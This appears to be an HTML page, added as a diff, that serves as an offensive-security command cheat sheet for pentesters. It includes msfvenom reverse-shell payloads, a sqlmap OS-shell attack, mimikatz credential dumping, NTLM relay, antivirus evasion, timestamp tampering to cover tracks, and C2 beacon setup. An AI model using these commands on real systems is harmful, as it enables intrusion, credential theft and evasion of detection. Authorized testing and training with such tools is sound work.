@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PENTESTER'S ARSENAL • Advanced Security Toolkit</title>
+    <style>
+        /* Reset & base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Fira Code', 'Courier New', monospace;
+        }
+
+        body {
+            background: #0a0c0f;
+            color: #00ffaa;
+            line-height: 1.6;
+        }
+
+        /* Glitch effect */
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00fff9; }
+            25% { text-shadow: -0.05em -0.025em 0 #ff00c1, 0.025em 0.05em 0 #00fff9; }
+            50% { text-shadow: 0.025em 0.05em 0 #ff00c1, 0.05em 0 0 #00fff9; }
+            75% { text-shadow: -0.025em 0 0 #ff00c1, -0.025em -0.025em 0 #00fff9; }
+            100% { text-shadow: 0.05em 0 0 #ff00c1, -0.05em -0.025em 0 #00fff9; }
+        }
+
+        .glitch {
+            animation: glitch 3s infinite;
+        }
+
+        /* Matrix rain */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, transparent 0%, #0a0c0f 100%);
+            opacity: 0.3;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .matrix-bg::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, 
+                rgba(0, 255, 0, 0.03) 1px, 
+                transparent 2px,
+                rgba(0, 255, 0, 0.02) 3px,
+                transparent 4px);
+            animation: matrix 20s linear infinite;
+        }
+
+        @keyframes matrix {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
+        /* Header */
+        .header {
+            position: relative;
+            z-index: 10;
+            background: #0f1217;
+            border-bottom: 3px solid #00ffaa;
+            padding: 2rem;
+            box-shadow: 0 0 50px rgba(0, 255, 170, 0.3);
+        }
+
+        .title {
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            font-weight: 900;
+            text-align: center;
+            color: #00ffaa;
+            text-shadow: 0 0 20px #00ffaa, 0 0 40px #00ffaa;
+            letter-spacing: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #88ffcc;
+            font-size: 1.2rem;
+            margin-top: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+        }
+
+        /* Legal disclaimer - plus technique */
+        .legal-panel {
+            background: #1a1e2a;
+            border: 2px solid #ffaa00;
+            padding: 2rem;
+            margin: 2rem auto;
+            max-width: 1200px;
+            border-radius: 8px;
+            box-shadow: 0 0 40px rgba(255, 170, 0, 0.2);
+        }
+
+        .legal-title {
+            color: #ffaa00;
+            font-size: 1.8rem;
+            border-left: 10px solid #ffaa00;
+            padding-left: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Main container */
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Search & filters */
+        .toolbar {
+            background: #0f1217;
+            border: 1px solid #00ffaa;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            border-radius: 8px;
+        }
+
+        #searchInput {
+            flex: 2;
+            background: #1a1f2a;
+            border: 1px solid #00ffaa;
+            padding: 1rem;
+            color: #00ffaa;
+            font-size: 1rem;
+            min-width: 300px;
+            border-radius: 4px;
+        }
+
+        .filter-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .filter-btn {
+            background: transparent;
+            border: 1px solid #00ffaa;
+            color: #00ffaa;
+            padding: 0.8rem 1.5rem;
+            cursor: pointer;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+
+        .filter-btn.active {
+            background: #00ffaa;
+            color: #0a0c0f;
+            box-shadow: 0 0 20px #00ffaa;
+        }
+
+        .filter-btn:hover {
+            background: #1a3a2a;
+        }
+
+        /* Stats panel */
+        .stats-panel {
+            background: #0f1217;
+            border: 1px solid #00ffaa;
+            padding: 1rem 2rem;
+            margin: 1rem 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+
+        .counter {
+            font-size: 1.2rem;
+        }
+
+        .counter span {
+            font-size: 2rem;
+            color: #00ffaa;
+            font-weight: bold;
+            margin-right: 0.5rem;
+        }
+
+        .reset-btn {
+            background: transparent;
+            border: 1px solid #ff4444;
+            color: #ff4444;
+            padding: 0.5rem 2rem;
+            cursor: pointer;
+            border-radius: 4px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .reset-btn:hover {
+            background: #ff4444;
+            color: black;
+        }
+
+        /* Grid */
+        .commands-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        /* Command card - version pro */
+        .command-card {
+            background: #0f1217;
+            border: 1px solid;
+            border-radius: 12px;
+            padding: 1.8rem;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .command-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 0 50px currentColor;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid;
+            padding-bottom: 1rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .command-name {
+            font-size: 1.8rem;
+            font-weight: 800;
+            font-family: 'Courier New', monospace;
+            word-break: break-word;
+        }
+
+        .difficulty {
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        .difficulty.beginner { color: #00ff00; border: 1px solid #00ff00; }
+        .difficulty.intermediate { color: #ffaa00; border: 1px solid #ffaa00; }
+        .difficulty.advanced { color: #ff4444; border: 1px solid #ff4444; }
+        .difficulty.expert { color: #ff00ff; border: 1px solid #ff00ff; }
+
+        .command-desc {
+            font-size: 1rem;
+            margin: 1rem 0;
+            color: #ccffcc;
+        }
+
+        .command-example {
+            background: #0a0c0f;
+            border-left: 4px solid;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            border-radius: 0 4px 4px 0;
+            color: #ffffff;
+            white-space: pre-wrap;
+            margin: 1rem 0;
+            overflow-x: auto;
+        }
+
+        .metadata {
+            display: flex;
+            gap: 1rem;
+            margin: 1rem 0;
+            flex-wrap: wrap;
+        }
+
+        .metadata-item {
+            background: #1a1f2a;
+            padding: 0.3rem 1rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            border: 1px solid;
+        }
+
+        .command-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 1.5rem;
+        }
+
+        .copy-btn {
+            background: transparent;
+            border: 1px solid #00ffaa;
+            color: #00ffaa;
+            padding: 0.5rem 1.5rem;
+            cursor: pointer;
+            border-radius: 4px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .copy-btn:hover {
+            background: #00ffaa;
+            color: black;
+        }
+
+        /* Methodology sections */
+        .methodology {
+            margin: 4rem 0;
+            padding: 2rem;
+            background: #0f1217;
+            border: 2px solid #00ffaa;
+            border-radius: 12px;
+        }
+
+        .methodology-title {
+            font-size: 2rem;
+            color: #00ffaa;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .methodology-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+        }
+
+        .methodology-item {
+            border-left: 4px solid #00ffaa;
+            padding-left: 1rem;
+        }
+
+        .methodology-item h3 {
+            color: white;
+            margin-bottom: 1rem;
+        }
+
+        .methodology-item ul {
+            list-style-type: none;
+        }
+
+        .methodology-item li {
+            color: #88ffcc;
+            margin: 0.5rem 0;
+            font-size: 0.9rem;
+        }
+
+        footer {
+            background: #0f1217;
+            border-top: 2px solid #00ffaa;
+            padding: 3rem;
+            text-align: center;
+            margin-top: 4rem;
+        }
+
+        @media (max-width: 700px) {
+            .commands-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg"></div>
+
+    <div class="header">
+        <h1 class="title glitch">KEVIN'S ARSENAL</h1>
+        <div class="subtitle">ADVANCED SECURITY TESTING FRAMEWORK • PROFESSIONAL EDITION</div>
+    </div>
+
+    <div class="container">
+        <!-- Legal framework (professional) -->
+        <div class="legal-panel">
+            <div class="legal-title">📋 PROFESSIONAL USE AUTHORIZATION</div>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
+                <div>
+                    <h3 style="color: #ffaa00;">REQUIRED AUTHORIZATIONS</h3>
+                    <ul style="color: #ffcc88; margin-top: 1rem; list-style-type: square; margin-left: 1.5rem;">
+                        <li>Signed penetration testing contract (SOW)</li>
+                        <li>Written authorization from system owner</li>
+                        <li>Defined scope and rules of engagement</li>
+                        <li>Emergency contacts and escalation procedures</li>
+                        <li>Data handling and confidentiality agreement</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 style="color: #ffaa00;">PROFESSIONAL STANDARDS</h3>
+                    <ul style="color: #ffcc88; margin-top: 1rem; list-style-type: square; margin-left: 1.5rem;">
+                        <li>PTES (Penetration Testing Execution Standard)</li>
+                        <li>OWASP Testing Guide</li>
+                        <li>NIST SP 800-115</li>
+                        <li>OSSTMM</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Toolbar -->
+        <div class="toolbar">
+            <input type="text" id="searchInput" placeholder="Search by command, tool, CVE, technique...">
+            <div class="filter-group" id="categoryFilter"></div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-panel">
+            <div class="counter"><span id="commandCount">0</span> advanced techniques</div>
+            <button class="reset-btn" id="resetFilters">⟲ RESET FILTERS</button>
+        </div>
+
+        <!-- Commands grid -->
+        <div id="commandsGrid" class="commands-grid"></div>
+
+        <!-- Professional methodology -->
+        <div class="methodology">
+            <h2 class="methodology-title">🔬 PROFESSIONAL TESTING METHODOLOGY</h2>
+            <div class="methodology-grid">
+                <div class="methodology-item">
+                    <h3>1. RECONNAISSANCE</h3>
+                    <ul>
+                        <li>Passive OSINT (theHarvester, recon-ng)</li>
+                        <li>Active scanning (nmap, masscan)</li>
+                        <li>Service enumeration</li>
+                        <li>Technology fingerprinting</li>
+                    </ul>
+                </div>
+                <div class="methodology-item">
+                    <h3>2. VULNERABILITY ANALYSIS</h3>
+                    <ul>
+                        <li>Automated scanners (Nessus, OpenVAS)</li>
+                        <li>Manual verification</li>
+                        <li>Exploit research (searchsploit, CVE databases)</li>
+                        <li>False positive analysis</li>
+                    </ul>
+                </div>
+                <div class="methodology-item">
+                    <h3>3. EXPLOITATION</h3>
+                    <ul>
+                        <li>Proof of concept development</li>
+                        <li>Metasploit framework</li>
+                        <li>Custom exploit creation</li>
+                        <li>Privilege escalation</li>
+                    </ul>
+                </div>
+                <div class="methodology-item">
+                    <h3>4. POST-EXPLOITATION</h3>
+                    <ul>
+                        <li>Persistence mechanisms</li>
+                        <li>Lateral movement</li>
+                        <li>Data exfiltration (proof)</li>
+                        <li>Covering tracks (forensic evasion)</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div>⚡ KEVIN'S ARSENAL • PROFESSIONAL SECURITY TESTING TOOLKIT • 2026</div>
+        <div style="margin-top: 1rem; color: #88ffcc;">Authorized use only • All techniques documented for defensive purposes</div>
+    </footer>
+
+    <script>
+        (function() {
+            // PROFESSIONAL DATABASE - ADVANCED TECHNIQUES
+            const commands = [
+                // ========== ADVANCED RECONNAISSANCE ==========
+                {
+                    name: "masscan + nmap",
+                    desc: "Massive scanning combined with service detection - Scan complet de grands réseaux avec détection de services",
+                    example: "masscan -p1-65535 --rate=10000 10.0.0.0/8 -oG masscan.out && nmap -sV -iL masscan.out -oA full_scan",
+                    category: "recon",
+                    difficulty: "advanced",
+                    tool: "masscan, nmap",
+                    cve: "N/A",
+                    tags: ["scanning", "discovery", "large networks"]
+                },
+                {
+                    name: "nmap NSE (vuln categories)",
+                    desc: "Nmap Scripting Engine - Détection automatisée de vulnérabilités",
+                    example: "nmap -sV --script vuln,exploit,auth,default 192.168.1.0/24 -oA vuln_scan",
+                    category: "recon",
+                    difficulty: "intermediate",
+                    tool: "nmap",
+                    tags: ["vulnerability", "scanning", "automation"]
+                },
+                {
+                    name: "dnsrecon + fierce",
+                    desc: "DNS enumeration avancée avec tentative de transfert de zone et brute-force",
+                    example: "dnsrecon -d example.com -t axfr,zonewalk,bing,bruce --lifetime 10",
+                    category: "recon",
+                    difficulty: "intermediate",
+                    tool: "dnsrecon",
+                    tags: ["dns", "osint", "recon"]
+                },
+                {
+                    name: "theHarvester",
+                    desc: "OSINT - collecte d'emails, sous-domaines, hôtes depuis sources publiques",
+                    example: "theHarvester -d example.com -b google,linkedin,bing,pgp,trello -f results.html",
+                    category: "recon",
+                    difficulty: "intermediate",
+                    tool: "theHarvester",
+                    tags: ["osint", "emails", "domains"]
+                },
+                {
+                    name: "amass",
+                    desc: "Cartographie de surfaces d'attaque - Découverte approfondie de sous-domaines",
+                    example: "amass enum -d example.com -config config.ini -o domains.txt -dir output",
+                    category: "recon",
+                    difficulty: "advanced",
+                    tool: "amass",
+                    tags: ["osint", "subdomains", "attack surface"]
+                },
+
+                // ========== EXPLOITATION (ADVANCED) ==========
+                {
+                    name: "metasploit - custom exploit",
+                    desc: "Développement et exécution d'exploit personnalisé dans Metasploit",
+                    example: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nexploit -j",
+                    category: "exploit",
+                    difficulty: "expert",
+                    tool: "metasploit",
+                    tags: ["payload", "meterpreter", "shell"]
+                },
+                {
+                    name: "sqlmap - OS shell",
+                    desc: "Obtention d'un shell système via injection SQL (--os-shell)",
+                    example: "sqlmap -u 'http://target.com/page.php?id=1' --os-shell --technique=E --dbms=mysql",
+                    category: "exploit",
+                    difficulty: "advanced",
+                    tool: "sqlmap",
+                    note: "Nécessite des privilèges élevés sur la base de données",
+                    tags: ["sql injection", "rce", "database"]
+                },
+                {
+                    name: "enum4linux-ng",
+                    desc: "Énumération avancée Samba/Windows (null sessions, RPC)",
+                    example: "enum4linux-ng -A -M -l -s 192.168.1.100 -oA enum_output",
+                    category: "exploit",
+                    difficulty: "intermediate",
+                    tool: "enum4linux",
+                    tags: ["windows", "smb", "rpc", "enumeration"]
+                },
+                {
+                    name: "crackmapexec",
+                    desc: "Post-exploitation et mouvement latéral sur réseaux Windows",
+                    example: "crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success",
+                    category: "exploit",
+                    difficulty: "advanced",
+                    tool: "crackmapexec",
+                    tags: ["smb", "winrm", "lateral movement"]
+                },
+                {
+                    name: "responder + ntlmrelayx",
+                    desc: "Attaque LLMNR/NBT-NS poisoning avec relais NTLM",
+                    example: "responder -I eth0 -wrf --lm\npython3 ntlmrelayx.py -tf targets.txt -smb2support",
+                    category: "exploit",
+                    difficulty: "expert",
+                    tool: "responder, impacket",
+                    tags: ["llmnr", "ntlm", "relay", "mitm"]
+                },
+
+                // ========== PRIVILEGE ESCALATION ==========
+                {
+                    name: "linux smart enumeration (LinPEAS)",
+                    desc: "Script d'énumération automatique pour escalade de privilèges Linux",
+                    example: "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh -a > linpeas_output.txt",
+                    category: "privesc",
+                    difficulty: "intermediate",
+                    tool: "linpeas",
+                    tags: ["linux", "enumeration", "privesc"]
+                },
+                {
+                    name: "windows privilege escalation (WinPEAS)",
+                    desc: "Énumération Windows pour escalade de privilèges",
+                    example: "winpeas.exe > winpeas_output.txt",
+                    category: "privesc",
+                    difficulty: "intermediate",
+                    tool: "winpeas",
+                    tags: ["windows", "enumeration", "privesc"]
+                },
+                {
+                    name: "linux kernel exploit suggester",
+                    desc: "Suggestions d'exploits basées sur la version du kernel",
+                    example: "uname -a | ./linux-exploit-suggester.sh",
+                    category: "privesc",
+                    difficulty: "advanced",
+                    tool: "linux-exploit-suggester",
+                    tags: ["kernel", "exploit", "privesc"]
+                },
+                {
+                    name: "JuicyPotato / RoguePotato",
+                    desc: "Escalade de privilèges Windows via SeImpersonatePrivilege",
+                    example: "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami\" -t *",
+                    category: "privesc",
+                    difficulty: "expert",
+                    tool: "JuicyPotato",
+                    cve: "CVE-2016-3225",
+                    tags: ["windows", "seimpersonate", "system"]
+                },
+
+                // ========== POST-EXPLOITATION ==========
+                {
+                    name: "mimikatz",
+                    desc: "Extraction de credentials mémoire (passwords, hashes, tickets)",
+                    example: "privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam",
+                    category: "postexp",
+                    difficulty: "advanced",
+                    tool: "mimikatz",
+                    tags: ["credentials", "lsass", "kerberos", "wdigest"]
+                },
+                {
+                    name: "bloodhound + sharphound",
+                    desc: "Cartographie des relations Active Directory pour trouver chemins d'attaque",
+                    example: "SharpHound.exe -c All --zipfilename bloodhound_data\n# Importer dans BloodHound GUI",
+                    category: "postexp",
+                    difficulty: "expert",
+                    tool: "bloodhound",
+                    tags: ["active directory", "privilege escalation", "trusts"]
+                },
+                {
+                    name: "pypykatz",
+                    desc: "Version Python de Mimikatz pour extraction LSASS (Linux/Windows)",
+                    example: "pypykatz lsa minidump lsass.dmp",
+                    category: "postexp",
+                    difficulty: "advanced",
+                    tool: "pypykatz",
+                    tags: ["credentials", "lsass", "forensic"]
+                },
+                {
+                    name: "psexec (impacket)",
+                    desc: "Exécution à distance via SMB (similaire à psexec de SysInternals)",
+                    example: "impacket-psexec domain/username:password@192.168.1.100",
+                    category: "postexp",
+                    difficulty: "intermediate",
+                    tool: "impacket",
+                    tags: ["smb", "remote execution", "windows"]
+                },
+                {
+                    name: "wmiexec (impacket)",
+                    desc: "Exécution silencieuse via WMI (moins de logs que psexec)",
+                    example: "impacket-wmiexec domain/username:password@192.168.1.100",
+                    category: "postexp",
+                    difficulty: "advanced",
+                    tool: "impacket",
+                    tags: ["wmi", "stealth", "remote execution"]
+                },
+
+                // ========== WIRELESS ATTACKS ==========
+                {
+                    name: "aircrack-ng suite",
+                    desc: "Suite complète d'audit WiFi (cracking WEP/WPA, déauth, etc.)",
+                    example: "airmon-ng start wlan0\nairodump-ng wlan0mon\nairodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon\naireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon\naircrack-ng -w wordlist.txt capture-01.cap",
+                    category: "wireless",
+                    difficulty: "advanced",
+                    tool: "aircrack-ng",
+                    tags: ["wifi", "wep", "wpa", "handshake"]
+                },
+                {
+                    name: "bettercap",
+                    desc: "Framework MITM avancé avec modules HTTP/HTTPS, DNS spoofing",
+                    example: "bettercap -eval \"set arp.spoof.targets 192.168.1.100; arp.spoof on; net.sniff on\"",
+                    category: "wireless",
+                    difficulty: "expert",
+                    tool: "bettercap",
+                    tags: ["mitm", "arp spoofing", "sniffing"]
+                },
+                {
+                    name: "wifi deauth with mdk4",
+                    desc: "Attaque de désauthentification massive",
+                    example: "mdk4 wlan0mon d -b target_bssid.txt -c 6",
+                    category: "wireless",
+                    difficulty: "advanced",
+                    tool: "mdk4",
+                    tags: ["wifi", "dos", "deauth"]
+                },
+
+                // ========== WEB APPLICATION ==========
+                {
+                    name: "burpsuite intruder",
+                    desc: "Fuzzing avancé avec payload processing et grepping",
+                    example: "Intruder → Positions → Attack type: Cluster bomb → Payloads → Options: Grep extract",
+                    category: "web",
+                    difficulty: "expert",
+                    tool: "burpsuite",
+                    tags: ["fuzzing", "automation", "web"]
+                },
+                {
+                    name: "ffuf",
+                    desc: "Fast Web Fuzzer - directory busting, parameter fuzzing",
+                    example: "ffuf -u http://example.com/FUZZ -w wordlist.txt -e .php,.asp,.aspx -fc 404 -c -t 50",
+                    category: "web",
+                    difficulty: "advanced",
+                    tool: "ffuf",
+                    tags: ["fuzzing", "directory busting", "parameter"]
+                },
+                {
+                    name: "xsstrike",
+                    desc: "Détection et exploitation avancée de XSS",
+                    example: "xsstrike -u 'http://example.com/page.php?param=test' --crawl --fuzzer --blind",
+                    category: "web",
+                    difficulty: "advanced",
+                    tool: "xsstrike",
+                    tags: ["xss", "crawler", "exploitation"]
+                },
+                {
+                    name: "commix",
+                    desc: "Détection et exploitation d'injections de commandes",
+                    example: "commix -u 'http://example.com/page.php?cmd=test' --os=linux --technique=bf",
+                    category: "web",
+                    difficulty: "advanced",
+                    tool: "commix",
+                    tags: ["command injection", "rce"]
+                },
+
+                // ========== CLOUD & CONTAINERS ==========
+                {
+                    name: "scoutsuite",
+                    desc: "Audit de sécurité multi-cloud (AWS, Azure, GCP)",
+                    example: "scoutsuite aws --profile prod --report-dir ./reports",
+                    category: "cloud",
+                    difficulty: "expert",
+                    tool: "scoutsuite",
+                    tags: ["aws", "azure", "gcp", "cloud security"]
+                },
+                {
+                    name: "grype",
+                    desc: "Scan de vulnérabilités d'images Docker/OCI",
+                    example: "grype ubuntu:latest --scope all-layers",
+                    category: "cloud",
+                    difficulty: "intermediate",
+                    tool: "grype",
+                    tags: ["containers", "docker", "cve scanning"]
+                },
+                {
+                    name: "kube-hunter",
+                    desc: "Test d'intrusion pour clusters Kubernetes",
+                    example: "kube-hunter --remote k8s.example.com --quick",
+                    category: "cloud",
+                    difficulty: "expert",
+                    tool: "kube-hunter",
+                    tags: ["kubernetes", "k8s", "container orchestration"]
+                },
+
+                // ========== FORENSIC & EVASION ==========
+                {
+                    name: "timestomp",
+                    desc: "Modification des timestamps pour couvrir ses traces (forensic evasion)",
+                    example: "timestomp -f /bin/ls -c /bin/bash\n# Ou sur Windows: Set-MacAttribute -FilePath malware.exe -Date '01/01/2020 12:00'",
+                    category: "forensic",
+                    difficulty: "expert",
+                    tool: "timestomp",
+                    tags: ["antiforensic", "timestamps", "evasion"]
+                },
+                {
+                    name: "shellter",
+                    desc: "Injection de shellcode dans des exécutables légitimes",
+                    example: "shellter.exe --target putty.exe --payload windows/shell_reverse_tcp --lhost 192.168.1.100 --lport 4444",
+                    category: "exploit",
+                    difficulty: "expert",
+                    tool: "shellter",
+                    tags: ["av evasion", "payload", "backdoor"]
+                },
+                {
+                    name: "veil framework",
+                    desc: "Génération de payloads avec évasion antivirus",
+                    example: "veil\nuse evasion\nlist\nuse 41\nset LHOST 192.168.1.100\ngenerate",
+                    category: "exploit",
+                    difficulty: "expert",
+                    tool: "veil",
+                    tags: ["av evasion", "payload", "metasploit"]
+                },
+
+                // ========== C2 & PERSISTENCE ==========
+                {
+                    name: "cobalt strike (aggressor script)",
+                    desc: "C2 avancé avec scripts personnalisés",
+                    example: "aggressor script example:\nbeacon> powershell-import /path/to/script.ps1\nbeacon> powershell Invoke-MyModule",
+                    category: "c2",
+                    difficulty: "expert",
+                    tool: "cobalt strike",
+                    tags: ["c2", "command & control", "beacon"]
+                },
+                {
+                    name: "empire framework",
+                    desc: "Post-exploitation et C2 avec modules PowerShell/Python",
+                    example: "usemodule persistence/userland/registry\nset Listener http\nexecute",
+                    category: "c2",
+                    difficulty: "expert",
+                    tool: "empire",
+                    tags: ["c2", "powershell", "persistence"]
+                },
+                {
+                    name: "sliver c2",
+                    desc: "C2 open-source (alternative à Cobalt Strike)",
+                    example: "generate --http 192.168.1.100 --save beacon.exe\nmtls --lport 8888\nuse 1\ninteractive",
+                    category: "c2",
+                    difficulty: "advanced",
+                    tool: "sliver",
+                    tags: ["c2", "multiplayer", "implants"]
+                },
+            ];
+
+            // State
+            let currentCategory = "all";
+            let searchTerm = "";
+
+            // Render categories
+            function renderCategories() {
+                const cats = [...new Set(commands.map(c => c.category))].sort();
+                const container = document.getElementById('categoryFilter');
+                const catNames = {
+                    recon: "RECON",
+                    exploit: "EXPLOIT",
+                    privesc: "PRIVESC",
+                    postexp: "POST-EXP",
+                    wireless: "WIRELESS",
+                    web: "WEB",
+                    cloud: "CLOUD",
+                    forensic: "FORENSIC",
+                    c2: "C2"
+                };
+                
+                let html = `<button class="filter-btn active" data-cat="all">ALL</button>`;
+                cats.forEach(cat => {
+                    html += `<button class="filter-btn" data-cat="${cat}">${catNames[cat] || cat.toUpperCase()}</button>`;
+                });
+                container.innerHTML = html;
+
+                document.querySelectorAll('.filter-btn').forEach(btn => {
+                    btn.addEventListener('click', (e) => {
+                        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+                        btn.classList.add('active');
+                        currentCategory = btn.dataset.cat;
+                        renderGrid();
+                    });
+                });
+            }
+
+            // Filter commands
+            function filterCommands() {
+                return commands.filter(cmd => {
+                    const matchCategory = currentCategory === "all" || cmd.category === currentCategory;
+                    const matchSearch = searchTerm === "" || 
+                        cmd.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
+                        cmd.desc.toLowerCase().includes(searchTerm.toLowerCase()) ||
+                        (cmd.tool && cmd.tool.toLowerCase().includes(searchTerm.toLowerCase())) ||
+                        (cmd.tags && cmd.tags.some(t => t.includes(searchTerm.toLowerCase()))) ||
+                        (cmd.cve && cmd.cve.toLowerCase().includes(searchTerm.toLowerCase()));
+                    return matchCategory && matchSearch;
+                });
+            }
+
+            // Render grid
+            function renderGrid() {
+                const filtered = filterCommands();
+                const grid = document.getElementById('commandsGrid');
+                document.getElementById('commandCount').textContent = filtered.length;
+
+                if (filtered.length === 0) {
+                    grid.innerHTML = `<div style="grid-column:1/-1; text-align:center; padding:4rem; background:#0f1217; border:2px solid #ff4444; font-size:1.5rem;">⛔ NO TECHNIQUES FOUND</div>`;
+                    return;
+                }
+
+                let html = '';
+                filtered.forEach(cmd => {
+                    const difficultyColor = {
+                        beginner: '#00ff00',
+                        intermediate: '#ffaa00',
+                        advanced: '#ff4444',
+                        expert: '#ff00ff'
+                    }[cmd.difficulty] || '#00ffaa';
+
+                    html += `
+                        <div class="command-card" style="border-color: ${difficultyColor}">
+                            <div class="card-header">
+                                <span class="command-name">${cmd.name}</span>
+                                <span class="difficulty ${cmd.difficulty}">${cmd.difficulty}</span>
+                            </div>
+                            <div class="command-desc">${cmd.desc}</div>
+                            <div class="command-example" style="border-color: ${difficultyColor}">❯ ${cmd.example}</div>
+                            <div class="metadata">
+                                <span class="metadata-item" style="border-color: ${difficultyColor}">🛠️ ${cmd.tool || 'built-in'}</span>
+                                ${cmd.cve ? `<span class="metadata-item" style="border-color: #ff4444">⚠️ ${cmd.cve}</span>` : ''}
+                            </div>
+                            <div class="metadata">
+                                ${cmd.tags ? cmd.tags.map(t => `<span class="metadata-item" style="border-color: ${difficultyColor}; opacity:0.8">#${t}</span>`).join('') : ''}
+                            </div>
+                            <div class="command-footer">
+                                <span style="color: #88ffcc">⚡ advanced technique</span>
+                                <button class="copy-btn" data-cmd="${cmd.example.replace(/"/g, '&quot;')}">📋 COPY</button>
+                            </div>
+                        </div>
+                    `;
+                });
+
+                grid.innerHTML = html;
+
+                // Copy functionality
+                document.querySelectorAll('.copy-btn').forEach(btn => {
+                    btn.addEventListener('click', (e) => {
+                        const cmdText = btn.dataset.cmd;
+                        navigator.clipboard.writeText(cmdText).then(() => {
+                            btn.textContent = '✅ COPIED';
+                            btn.style.background = '#00ffaa';
+                            btn.style.color = 'black';
+                            setTimeout(() => {
+                                btn.textContent = '📋 COPY';
+                                btn.style.background = 'transparent';
+                                btn.style.color = '#00ffaa';
+                            }, 1500);
+                        });
+                    });
+                });
+            }
+
+            // Initialize
+            document.addEventListener('DOMContentLoaded', () => {
+                renderCategories();
+                renderGrid();
+
+                document.getElementById('searchInput').addEventListener('input', (e) => {
+                    searchTerm = e.target.value;
+                    renderGrid();
+                });
+
+                document.getElementById('resetFilters').addEventListener('click', () => {
+                    document.getElementById('searchInput').value = '';
+                    searchTerm = '';
+                    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+                    document.querySelector('.filter-btn[data-cat="all"]').classList.add('active');
+                    currentCategory = 'all';
+                    renderGrid();
+                });
+            });
+        })();
+    </script>
+</body>
+</html>
